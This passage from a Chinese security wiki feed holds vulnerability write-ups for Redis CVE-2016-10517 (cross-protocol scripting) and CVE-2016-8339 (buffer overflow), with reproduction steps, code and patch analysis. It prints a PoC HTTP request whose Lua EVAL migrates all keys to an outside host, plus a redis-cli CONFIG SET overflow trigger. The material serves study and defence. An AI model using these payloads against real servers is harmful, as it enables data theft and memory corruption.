href="https://github.com/natoscott/redis/commit/0ba2932298e3e432f32441ebc5d95a86158d706c">https://github.com/natoscott/redis/commit/0ba2932298e3e432f32441ebc5d95a86158d706c</a></li><li><a href="http://www.redis.cn/topics/cluster-tutorial.htm">http://www.redis.cn/topics/cluster-tutorial.htm</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-10517_Redis跨协议漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:49:21.000Z</published>
    <updated>2021-07-06T08:52:18.276Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis跨站脚本漏洞</li><li>漏洞编号：CVE-2016-10517</li><li>漏洞类型：跨协议脚本</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：7.4】</li><li>漏洞危害等级：中危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 3.2.7之前的版本中的networking.c文件存在跨站脚本漏洞。远程攻击者可利用该漏洞在浏览器中执行任意的脚本代码。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        攻击者可以远程访问redis-server</p><p>​        1.可以从浏览器发起特定的 HTTP 请求</p><p>​        2.可以从开发者的机器访问到 Redis 服务器</p><h3 id="漏洞影响。"><a href="#漏洞影响。" class="headerlink" title="漏洞影响。"></a>漏洞影响。</h3><p>​        Redis up to 3.2.7</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50">https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP/HTTP</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><p>在环境共享服务器中获取到环境源码\安装包，地址为:\\10.251.0.11\R-Redis\redis-3.2.7-unpacth.tar.zip文件，解压编译即可。</p><p>因为Redis对全版本进行了修复，若直接用redis-3.2.7源码编译，发送poc后，redis-server会提示该漏洞利用的提示：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/3.png"></p><p>并且发送的TCP连接会直接中断，如果存在漏洞redis-server会回复err不会直接断连接。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/11.png"></p><p>所以，先对redis-3.2.7源码进行去补丁操作。</p><p>补丁增加了一个判断函数 securityWarningCommand，将此函数的声明和调用在src/server.h、src/networking.c和src/server.c中删除。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/4.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/5.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        利用brup直接向靶机发送poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">post / HTTP/1.1</span><br><span class="line">Host: localhost: 6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintos; Intel Mac oS 10.12; rv: 50.0)</span><br><span class="line">Gecko/20100101 Firefox/50.0</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language: en-0s, en;g=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">referer: http: //localhost: 8000/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Content-Length: 10196</span><br><span class="line">origin: http: //localhost: 8000</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">EVAL &#x27;for k, v in pairs(redis. call(&quot;KEYS&quot;, &quot;*&quot;) do 4 redis.pcall(&quot;MIGRATE&quot;,&quot;whatsinm.com&quot;11111 5 v0,200)end&#x27;0</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/9.png"></p><p>​        未打补丁的redis-server则会响应，并保持连接。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/10.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/12.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​    Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        Redis 在解析命令的时候，会把每行文本当做输入。如果输入不能匹配上特定的命令，则丢弃输入。这意味着，如果我们用 HTTP 协议请求 Redis，那么 Redis 会跳过不认识的各种报头，执行请求体中的命令。举个例子，下面的 HTTP 请求中，只有最后的 EVAL 会被解析成合法的命令并执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">post / HTTP/1.1</span><br><span class="line">Host: localhost: 6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintos; Intel Mac oS 10.12; rv: 50.0)</span><br><span class="line">Gecko/20100101 Firefox/50.0</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language: en-0s, en;g=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">referer: http: //localhost: 8000/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Content-Length: 10196</span><br><span class="line">origin: http: //localhost: 8000</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">EVAL &#x27;for k, v in pairs(redis. call(&quot;KEYS&quot;, &quot;*&quot;) do 4 redis.pcall(&quot;MIGRATE&quot;,&quot;whatsinm.com&quot;11111 5 v0,200)end&#x27;0</span><br></pre></td></tr></table></figure><p>​        初看好像不算什么问题，毕竟攻击者都能直接请求 Redis 了，没必要用 HTTP 协议掩饰攻击行为。不过漏洞的发掘者想得更加深入。在他的 POC 中，构造了一个 HTML 页面，利用 AJAX 去请求 6379 端口。</p><p>​        一般来说，Redis 是不会暴露在公网里的，但是有可能跟开发者的机器在同一个内网中。假设开发者的浏览器发起了 AJAX 请求，便能绕过外网的限制，直接访问内网的 Redis。即使 Redis 不在 localhost 上，通过扫描（或者社工出具体的服务器地址）也有可能嗅探到内网中的 Redis 实例。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        在src/server.c中，声明全局数组redisCommandTable，存放redis中所有命令名称，由于不包括POST和host等一些HTTP定义的头部，导致无法判断出HTTP协议，攻击者将真实的redis命令写入HTTP协议的body中，redis没有直接拒绝连接而是继续搜索到body部分，成功执行命令。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/13.png"></p><p>每个列表由以下字段组成：</p><ul><li><p>name：表示命令名称的字符串。</p></li><li><p>function：指向实现命令的 C 函数的指针。</p></li><li><p>arity： 参数数，可以使用 -N 表示&gt;= N</p></li><li><p>sflags：命令标志为字符串。有关标志表，请参阅下文。</p></li><li><p>flags： 标志作为字掩码。由 Redis 使用”sflags”字段计算。</p></li><li><p>get_keys_proc：从命令获取键参数的可选函数。</p></li><li><p>这仅在以下三个字段不足以指定哪些参数是键。</p></li><li><p>first_key_index： 第一个参数是关键</p></li><li><p>last_key_index： 最后一个论点是关键</p></li><li><p>key_step：步骤获取从第一个到最后一个参数的所有键。</p></li><li><p>microseconds：此命令的总执行时间微秒。</p></li><li><p>calls：此命令的调用总数。</p></li><li><p>flags、 microseconds、calls字段由 Redis 计算，应始终设置为零。</p><p>​    命令标志使用字符串表示，其中每个字符都表示一个标志。稍后，populateCommandTable 函数将处理使用此字符填充真正的”flags”字段。</p></li></ul><p>这是标志的含义：</p><ul><li>w： 写入命令 （可以修改键空间）。</li><li>r： 读取命令（永远不会修改密钥空间）。</li><li>m： 一旦调用， 可能会增加内存使用量。如果内存不足，请不允许。</li><li>a： 管理命令，如保存或关闭。</li><li>p： Pub/子相关命令。</li><li>f： 强制复制此命令， 无论服务器。</li><li>s： 脚本中不允许使用命令。</li><li>R：随机命令。命令不是确定性的，也就是说，同一个命令具有相同的参数，具有相同的键空间，可能有不同的结果。例如，SPOP 和 RANDOMKEY 是两个随机命令。</li><li>S： 排序命令输出数组，如果从脚本调用，使输出是确定性的。</li><li>l：在加载数据库时允许命令。</li><li>t： 当从属有陈旧数据但不允许使用时，允许命令服务器此数据。在这种情况下，通常不接受任何命令但只是几个。</li><li>M： 不要在监视器上自动传播命令。</li><li>k： 对此命令执行隐式请求，因此该命令将如果插槽标记为”导入”，则接受群集模式。</li><li>F： 快速命令： O（1） 或 O（log（N）） 命令，不应延迟只要内核调度程序给我们时间，它的执行就行。注意，可能触发 DEL 作为副作用的命令（如 SET）不是快速命令。</li></ul><p>populateCommandTable函数对提交的命令进行flags的设置：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/15.png"></p><p>processCommand函数对提交的命令的flags进行判断是否为redisCommandTable中合法的命令，若不是则输出unknown command。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/14.png"></p><h4 id="漏洞触发过程"><a href="#漏洞触发过程" class="headerlink" title="漏洞触发过程"></a>漏洞触发过程</h4><p>​        在src/server.c中，声明全局数组redisCommandTable，存放redis中所有命令名称，由于不包括POST和host等一些HTTP定义的头部，导致无法判断出HTTP协议，攻击者将真实的redis命令写入HTTP协议的body中，redis没有直接拒绝连接，而是在processCommcand函数中一直搜索，遇到不在redisCommandTable中合法的命令，则输出unknown command。否则继续搜索到body部分，最后成功执行命令。</p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/4.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/5.png"></p><p>先分析 Redis 该补丁的工作原理：</p><p>​        作为 HTTP/1.1 规范，请求报头中应该有 Host 报头。如果没有，服务器会返回 400 错误码。这意味着，浏览器自己发送的 AJAX 请求中必然会带上 Host 报头。将Host和POST放进redisCommandTable数组中，当以后遇到这两个关键词，直接报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.</span><br></pre></td></tr></table></figure><p>​        可以尝试用 setRequestHeader 去自定义请求报头。</p><p>​        浏览器也知道这一点。如果用了 setRequestHeader，浏览器会先发送一个 OPTIONS 请求，附上 Access-Control-Request-Headers 报头，待目标服务器明断。只有服务器许可之后，才会进一步发送定制的 AJAX 请求。在这个场景里， Redis 自然什么都不会回复。</p><p>​        总而言之，没有什么办法，可以发送不带 Host 报头的 AJAX 请求。意味着只要 Host 被拉黑，所有的 AJAX 请求也被拉黑了。</p><p>对于没打该补丁的版本，该漏洞会有多大的影响？</p><p>​        漏洞依赖的第二点（可以从开发者的机器访问到 Redis 服务器），一般情况下难以满足。毕竟大多数时候，办公区网络和机房网络不在同一个网段里，而且还是互相隔离的。如果不是定点攻击，很难击中目标服务器。</p><p>​        漏洞依赖的第一点（可以从浏览器发起特定的 HTTP 请求），在很大程度上受浏览器的限制。对于那些想利用 AJAX 的攻击者，浏览器可是见得多了。不要忘记同源策略。即使黑客可以去请求特定的 Redis 服务器，受同源策略的影响，浏览器也不会返回响应的结果。意味着，攻击者可以向 Redis 发送命令，但是他们无法知道攻击是否成功。无法评估攻击的效果，通常会令漏洞的价值大打折扣。</p><p>​        当然如果能结合同源策略绕过，确实可以拿到具体的响应。但是这么一来利用空间就更窄了。</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>用HTTP协议伪装redis命令，在POST方法中的body部分添加redis命令。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50">https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50</a></li><li><a href="https://gist.githubusercontent.com/lamby/01ef8eaa7066282d0a5611a500ad4203/raw">https://gist.githubusercontent.com/lamby/01ef8eaa7066282d0a5611a500ad4203/raw</a></li><li><a href="https://segmentfault.com/a/1190000008237858">https://segmentfault.com/a/1190000008237858</a></li><li><a href="https://github.com/dxa4481/whatsinmyredis">https://github.com/dxa4481/whatsinmyredis</a></li><li><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-8339_Redis缓冲区溢出漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:36:40.000Z</published>
    <updated>2021-07-06T08:44:05.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis缓冲区溢出漏洞</li><li>漏洞编号：CVE-2016-8339</li><li>漏洞类型：缓冲区溢出</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：9.8】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        当发送精心制作的命令时，Redis 3.2.x中3.2.4之前的缓冲区溢出会导致任意代码执行。在Redis数据结构存储的CONFIG SET命令期间，对client-output-buffer-limit选项的处理中存在一个越界写入漏洞。精心设计的CONFIG SET命令导致越界写入，可能导致代码执行。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>1、攻击者可以访问到redis-server，redis-server配置外网可访问</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/9.png"></p><p>2、redis-server配置弱密码或空密码</p><p>3、redis-server取消保护模式</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10.png"></p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:3.2.0</p><p>Redis:3.2.1</p><p>Redis:3.2.2</p><p>Redis:3.2.3</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977">https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><p>​        在环境共享服务器中获取到环境源码\安装包，地址为:\\10.251.0.11\R-Redis\redis-3.2.3.tar.zip文件，解压编译即可。</p><p>​        启动前先更改配置文件redis.conf，配置外网可访问，取消保护模式。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/9.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        攻击机发送config set命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.251.0.36 CONFIG SET client-output-buffer-limit &quot;master 3735928559 3405691582 373529054&quot;</span><br></pre></td></tr></table></figure><p>​        class字段设置为master。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        redis-server返回ok，虽然redis-server并没有崩溃，但是越界写入已经成功。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/14.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p><strong>CONFIG SET client-output-buffer-limit命令</strong></p><p>​        <code>client-output-buffer-limit</code>使用<code>CONFIG SET</code>命令修改选项。设置<code>client-output-buffer-limit</code>选项所需的语法如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><p>​        例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &quot;slave 0 0 0&quot;</span><br></pre></td></tr></table></figure><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        <code>client-output-buffer-limit</code>使用<code>CONFIG SET</code>命令修改选项期间，存在写越界漏洞。设置<code>client-output-buffer-limit</code>选项所需的语法如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><p>​        当class值为master时，返回3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &quot;slave 0 0 0&quot;</span><br></pre></td></tr></table></figure><p>​        在解析中，对<code>client-output-buffer-limit</code>的调用<code>getClientTypeByName</code>用于检索相应类的类型。在这种情况下，<code>getClientTypeByName</code>返回[-1，3]集中的值。查看<code>client_obuf_limits</code>数组的声明，我们看到数组的大小为<code>3</code>。</p><p>​        此漏洞就是未考虑CONFIG SET client-output-buffer-limit 